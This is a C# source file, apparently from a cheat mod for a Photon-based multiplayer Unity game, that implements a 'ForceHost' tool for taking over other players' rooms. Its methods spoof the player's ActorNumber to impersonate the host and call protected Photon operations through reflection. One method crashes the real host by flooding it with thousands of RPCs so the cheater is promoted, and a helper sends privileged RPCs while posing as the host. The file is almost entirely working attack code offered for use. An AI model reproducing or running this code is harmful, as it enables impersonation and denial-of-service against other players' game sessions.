using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;
using Hashtable = ExitGames.Client.Photon.Hashtable;

namespace r.e.p.o_cheat;

public class ForceHost : MonoBehaviourPunCallbacks
{
	public NetworkManager manager;
	public MenuManager menuManager;
	public PhotonView pview;

	private static ForceHost _instance;
	public static string statusMessage = "";
	private static bool isProcessing = false;

	/// <summary>
	/// 当前是否正在进行主机夺取操作
	/// </summary>
	public static bool IsProcessing => isProcessing;

	public static ForceHost Instance
	{
		get
		{
			if ((Object)(object)_instance == (Object)null)
			{
				_instance = new GameObject("ForceHost").AddComponent<ForceHost>();
				Object.DontDestroyOnLoad((Object)(object)((Component)_instance).gameObject);
			}
			return _instance;
		}
	}

	public override void OnMasterClientSwitched(Player newMasterClient)
	{
		if (newMasterClient != null && newMasterClient.IsLocal)
		{
			statusMessage = L.T("room.force_success");
			Debug.Log("[ForceHost] 我们已成为主机!");
		}
	}

	// ================================================================
	// 方法1: 标准 SetMasterClient（需要禁用 NetworkManager 防止干扰）
	// ================================================================
	public IEnumerator Method_SetMasterClient()
	{
		if (isProcessing) yield break;
		isProcessing = true;

		if (!PhotonNetwork.InRoom)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		NetworkManager nm = FindNetworkManager();
		if (nm != null) ((Behaviour)nm).enabled = false;

		yield return (object)new WaitForSeconds(0.5f);

		bool sent = false;
		try { sent = PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer); }
		catch { }

		yield return (object)new WaitForSeconds(2f);
		if (nm != null) ((Behaviour)nm).enabled = true;

		if (!PhotonNetwork.IsMasterClient)
			statusMessage = L.T("room.method_fail_fmt", "1 - SetMasterClient");
		isProcessing = false;
	}

	// ================================================================
	// 方法2: 底层 Photon 操作 - 直接发送房间属性修改
	// 通过 LoadBalancingClient 绕过高级 API 限制
	// ================================================================
	public IEnumerator Method_LowLevelOp()
	{
		if (isProcessing) yield break;
		isProcessing = true;

		if (!PhotonNetwork.InRoom)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		NetworkManager nm = FindNetworkManager();
		if (nm != null) ((Behaviour)nm).enabled = false;

		yield return (object)new WaitForSeconds(0.3f);

		TryLowLevelSetMaster();

		yield return (object)new WaitForSeconds(2f);
		if (nm != null) ((Behaviour)nm).enabled = true;

		if (!PhotonNetwork.IsMasterClient)
			statusMessage = L.T("room.method_fail_fmt", "2 - LowLevel Op");
		isProcessing = false;
	}

	/// <summary>
	/// 通过反射调用受保护的 OpSetPropertiesOfRoom 方法
	/// </summary>
	private static bool TryLowLevelSetMaster()
	{
		try
		{
			Hashtable properties = new Hashtable();
			properties[(byte)248] = PhotonNetwork.LocalPlayer.ActorNumber;

			LoadBalancingClient client = PhotonNetwork.NetworkingClient;
			if (client == null) return false;

			// OpSetPropertiesOfRoom 是 protected，用反射调用
			MethodInfo opMethod = typeof(LoadBalancingClient).GetMethod("OpSetPropertiesOfRoom",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic,
				null,
				new Type[] { typeof(Hashtable), typeof(Hashtable), typeof(WebFlags) },
				null);

			if (opMethod != null)
			{
				bool sent = (bool)opMethod.Invoke(client, new object[] { properties, null, null });
				Debug.Log("[ForceHost] Low-level OpSetPropertiesOfRoom (反射) 发送: " + sent);
				return sent;
			}
			else
			{
				// 备选: 尝试通过 LoadBalancingPeer 发送原始操作
				return TryRawPeerOperation(client, properties);
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] Low-level op 异常: " + ex.Message);
			return false;
		}
	}

	/// <summary>
	/// 备选: 通过 LoadBalancingPeer.OpCustom 发送原始操作
	/// </summary>
	private static bool TryRawPeerOperation(LoadBalancingClient client, Hashtable properties)
	{
		try
		{
			// 获取 LoadBalancingPeer
			PropertyInfo peerProp = typeof(LoadBalancingClient).GetProperty("LoadBalancingPeer",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
			if (peerProp == null) return false;

			object peer = peerProp.GetValue(client);
			if (peer == null) return false;

			// 构建 SetProperties 操作参数 (OperationCode 252 = SetProperties)
			// ParameterCode.Properties = 251, ParameterCode.Broadcast = 250
			Dictionary<byte, object> opParams = new Dictionary<byte, object>();
			opParams[251] = properties;  // Properties
			opParams[250] = true;        // Broadcast

			// 调用 OpCustom(byte customOpCode, Dictionary<byte, object> customOpParameters, bool sendReliable)
			MethodInfo opCustom = peer.GetType().GetMethod("OpCustom",
				BindingFlags.Instance | BindingFlags.Public,
				null,
				new Type[] { typeof(byte), typeof(Dictionary<byte, object>), typeof(bool) },
				null);

			if (opCustom != null)
			{
				bool sent = (bool)opCustom.Invoke(peer, new object[] { (byte)252, opParams, true });
				Debug.Log("[ForceHost] Raw OpCustom(252) 发送: " + sent);
				return sent;
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] Raw peer op 异常: " + ex.Message);
		}
		return false;
	}

	// ================================================================
	// 方法3: ActorNumber 欺骗 + SetMasterClient
	// 利用 Troll.cs 已验证的反射技巧
	// ================================================================
	public IEnumerator Method_ActorNumberSpoof()
	{
		if (isProcessing) yield break;
		isProcessing = true;

		if (!PhotonNetwork.InRoom || PhotonNetwork.MasterClient == null)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.forcing");
		NetworkManager nm = FindNetworkManager();
		if (nm != null) ((Behaviour)nm).enabled = false;

		yield return (object)new WaitForSeconds(0.3f);

		DoActorNumberSpoof();

		yield return (object)new WaitForSeconds(2f);
		if (nm != null) ((Behaviour)nm).enabled = true;

		if (!PhotonNetwork.IsMasterClient)
			statusMessage = L.T("room.method_fail_fmt", "3 - ActorSpoof");
		isProcessing = false;
	}

	/// <summary>
	/// ActorNumber 欺骗逻辑（非协程，避免 yield + try-catch 冲突）
	/// </summary>
	private static void DoActorNumberSpoof()
	{
		try
		{
			int myActorNumber = PhotonNetwork.LocalPlayer.ActorNumber;
			int masterActorNumber = PhotonNetwork.MasterClient.ActorNumber;
			FieldInfo actorField = typeof(Player).GetField("actorNumber", BindingFlags.Instance | BindingFlags.NonPublic);

			if (actorField != null && myActorNumber != masterActorNumber)
			{
				// 临时伪装为MasterClient
				actorField.SetValue(PhotonNetwork.LocalPlayer, masterActorNumber);

				// 发送 SetMasterClient (此时本地看起来我们是master)
				PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);

				// 同时尝试底层操作
				Hashtable properties = new Hashtable();
				properties[(byte)248] = myActorNumber;
				TryLowLevelSetMasterWithProps(properties);

				// 恢复真实的 ActorNumber
				actorField.SetValue(PhotonNetwork.LocalPlayer, myActorNumber);
				Debug.Log("[ForceHost] ActorNumber 欺骗完成，已恢复");
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] ActorNumber 欺骗异常: " + ex.Message);
		}
	}

	private static void TryLowLevelSetMasterWithProps(Hashtable properties)
	{
		try
		{
			LoadBalancingClient client = PhotonNetwork.NetworkingClient;
			if (client == null) return;

			MethodInfo opMethod = typeof(LoadBalancingClient).GetMethod("OpSetPropertiesOfRoom",
				BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic,
				null,
				new Type[] { typeof(Hashtable), typeof(Hashtable), typeof(WebFlags) },
				null);

			if (opMethod != null)
			{
				opMethod.Invoke(client, new object[] { properties, null, null });
			}
		}
		catch { }
	}

	// ================================================================
	// 方法4: 崩溃当前主机 → 等待自动提升
	// 最可靠但最具侵略性的方法
	// ================================================================
	public IEnumerator Method_CrashHost()
	{
		if (isProcessing) yield break;
		isProcessing = true;

		if (!PhotonNetwork.InRoom || PhotonNetwork.MasterClient == null)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		if (PhotonNetwork.IsMasterClient)
		{
			statusMessage = L.T("room.already_host");
			isProcessing = false;
			yield break;
		}

		statusMessage = L.T("room.crashing_host");

		try
		{
			Player masterPlayer = PhotonNetwork.MasterClient;

			// 通过 LevelGenerator 的 RPC 崩溃主机
			LevelGenerator levelGen = Object.FindObjectOfType<LevelGenerator>();
			if ((Object)(object)levelGen != (Object)null)
			{
				for (int i = 0; i < 5000; i++)
				{
					levelGen.PhotonView.RPC("ItemSetup", masterPlayer, Array.Empty<object>());
					levelGen.PhotonView.RPC("NavMeshSetupRPC", masterPlayer, Array.Empty<object>());
				}
				Debug.Log("[ForceHost] 已向主机发送崩溃 RPC");
			}
			else
			{
				Debug.LogWarning("[ForceHost] 未找到 LevelGenerator，尝试 PhotonView 法");
				// 备选: 向主机发送大量无效RPC
				CrashPlayerByPhotonView(masterPlayer);
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] 崩溃主机异常: " + ex.Message);
		}

		// 等待主机断开连接并自动提升
		statusMessage = L.T("room.waiting_promotion");
		float waitTime = 0f;
		while (waitTime < 15f && !PhotonNetwork.IsMasterClient)
		{
			yield return (object)new WaitForSeconds(0.5f);
			waitTime += 0.5f;
		}

		if (PhotonNetwork.IsMasterClient)
			statusMessage = L.T("room.force_success");
		else
			statusMessage = L.T("room.method_fail_fmt", "4 - CrashHost");

		isProcessing = false;
	}

	// ================================================================
	// 方法5: 本地主机伪装 (仅修改本地标识，可发送主机专属RPC)
	// ================================================================
	public static bool Method_LocalMasterFake()
	{
		try
		{
			if (!PhotonNetwork.InRoom) return false;

			Room room = PhotonNetwork.CurrentRoom;
			int myActor = PhotonNetwork.LocalPlayer.ActorNumber;

			// 修改 Room.masterClientId
			FieldInfo masterIdField = typeof(Room).GetField("masterClientId",
				BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
			if (masterIdField != null)
			{
				masterIdField.SetValue(room, myActor);
				Debug.Log("[ForceHost] 本地 Room.masterClientId 已修改为 " + myActor);
			}

			// 也尝试 RoomInfo 基类的字段
			FieldInfo baseField = typeof(RoomInfo).GetField("masterClientId",
				BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
			if (baseField != null && baseField != masterIdField)
			{
				baseField.SetValue(room, myActor);
			}

			// 刷新 Player.IsMasterClient 缓存
			FieldInfo isMasterField = typeof(Player).GetField("isMasterClient",
				BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
			if (isMasterField != null)
			{
				// 将所有玩家的 isMasterClient 设为 false
				foreach (Player p in PhotonNetwork.PlayerList)
				{
					isMasterField.SetValue(p, false);
				}
				// 将自己的设为 true
				isMasterField.SetValue(PhotonNetwork.LocalPlayer, true);
			}

			statusMessage = L.T("room.local_fake_done");
			Debug.Log("[ForceHost] 本地主机伪装完成");
			return true;
		}
		catch (Exception ex)
		{
			statusMessage = L.T("room.method_fail_fmt", "5 - LocalFake: " + ex.Message);
			Debug.LogError("[ForceHost] 本地伪装异常: " + ex.Message);
			return false;
		}
	}

	// ================================================================
	// 方法6: 全自动 - 按顺序尝试所有方法
	// ================================================================
	public IEnumerator Method_AutoAll()
	{
		if (isProcessing) yield break;
		isProcessing = true;

		if (!PhotonNetwork.InRoom)
		{
			statusMessage = L.T("room.force_fail");
			isProcessing = false;
			yield break;
		}

		if (PhotonNetwork.IsMasterClient)
		{
			statusMessage = L.T("room.already_host");
			isProcessing = false;
			yield break;
		}

		// 尝试方法1: SetMasterClient
		statusMessage = L.T("room.trying_method_fmt", "1 - SetMasterClient");
		isProcessing = false; // 临时解锁让子协程运行
		yield return ((MonoBehaviour)Instance).StartCoroutine(Method_SetMasterClient());
		if (PhotonNetwork.IsMasterClient) yield break;

		yield return (object)new WaitForSeconds(0.5f);

		// 尝试方法2: 底层操作
		statusMessage = L.T("room.trying_method_fmt", "2 - LowLevel Op");
		yield return ((MonoBehaviour)Instance).StartCoroutine(Method_LowLevelOp());
		if (PhotonNetwork.IsMasterClient) yield break;

		yield return (object)new WaitForSeconds(0.5f);

		// 尝试方法3: ActorNumber 欺骗
		statusMessage = L.T("room.trying_method_fmt", "3 - ActorSpoof");
		yield return ((MonoBehaviour)Instance).StartCoroutine(Method_ActorNumberSpoof());
		if (PhotonNetwork.IsMasterClient) yield break;

		yield return (object)new WaitForSeconds(0.5f);

		// 尝试方法5: 本地伪装 (仅本地有效，不实际夺主机)
		statusMessage = L.T("room.trying_method_fmt", "5 - LocalFake");
		Method_LocalMasterFake();

		yield return (object)new WaitForSeconds(1f);

		if (!PhotonNetwork.IsMasterClient)
		{
			statusMessage = L.T("room.auto_suggest_crash");
		}
		isProcessing = false;
	}

	// ================================================================
	// 保留旧方法兼容
	// ================================================================
	public IEnumerator ForceStart(string levelName)
	{
		pview = GameObject.Find("Run Manager PUN").GetComponent<PhotonView>();
		PhotonNetwork.CurrentRoom.IsOpen = false;
		SteamManager.instance.LockLobby();
		DataDirector.instance.RunsPlayedAdd();
		pview.RPC("UpdateLevelRPC", (RpcTarget)0, new object[3] { levelName, 0, false });
		RunManager.instance.ChangeLevel(true, false, (RunManager.ChangeLevelType)1);
		manager = GameObject.Find("Network Manager").GetComponent<NetworkManager>();
		((Behaviour)manager).enabled = false;
		yield return (object)new WaitForSeconds(2f);
		PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
		pview.RPC("UpdateLevelRPC", (RpcTarget)0, new object[3] { levelName, 0, false });
		yield return (object)new WaitForSeconds(1f);
		((Behaviour)manager).enabled = true;
	}

	// ================================================================
	// 辅助方法
	// ================================================================

	private static NetworkManager FindNetworkManager()
	{
		try
		{
			GameObject obj = GameObject.Find("Network Manager");
			return (obj != null) ? obj.GetComponent<NetworkManager>() : null;
		}
		catch { return null; }
	}

	/// <summary>
	/// 向目标玩家发送大量RPC使其崩溃（备选方案）
	/// </summary>
	private static void CrashPlayerByPhotonView(Player target)
	{
		try
		{
			PhotonView[] views = Object.FindObjectsOfType<PhotonView>();
			int count = 0;
			foreach (PhotonView pv in views)
			{
				if ((Object)(object)pv == (Object)null) continue;
				try
				{
					pv.RPC("ItemSetup", target, Array.Empty<object>());
					count++;
					if (count >= 3000) break;
				}
				catch { }
			}
			Debug.Log("[ForceHost] 已通过 PhotonView 发送 " + count + " 个崩溃 RPC");
		}
		catch { }
	}

	/// <summary>
	/// 用于 ActorNumber 欺骗模式：临时伪装为主机发送特定RPC
	/// </summary>
	public static void SendRPCAsHost(PhotonView targetView, string rpcName, RpcTarget rpcTarget, params object[] args)
	{
		try
		{
			if (!PhotonNetwork.InRoom || PhotonNetwork.MasterClient == null) return;

			int myActorNumber = PhotonNetwork.LocalPlayer.ActorNumber;
			int masterActorNumber = PhotonNetwork.MasterClient.ActorNumber;
			FieldInfo actorField = typeof(Player).GetField("actorNumber", BindingFlags.Instance | BindingFlags.NonPublic);

			if (actorField != null)
			{
				actorField.SetValue(PhotonNetwork.LocalPlayer, masterActorNumber);
				try
				{
					targetView.RPC(rpcName, rpcTarget, args);
				}
				finally
				{
					actorField.SetValue(PhotonNetwork.LocalPlayer, myActorNumber);
				}
			}
		}
		catch (Exception ex)
		{
			Debug.LogError("[ForceHost] SendRPCAsHost 异常: " + ex.Message);
		}
	}
}
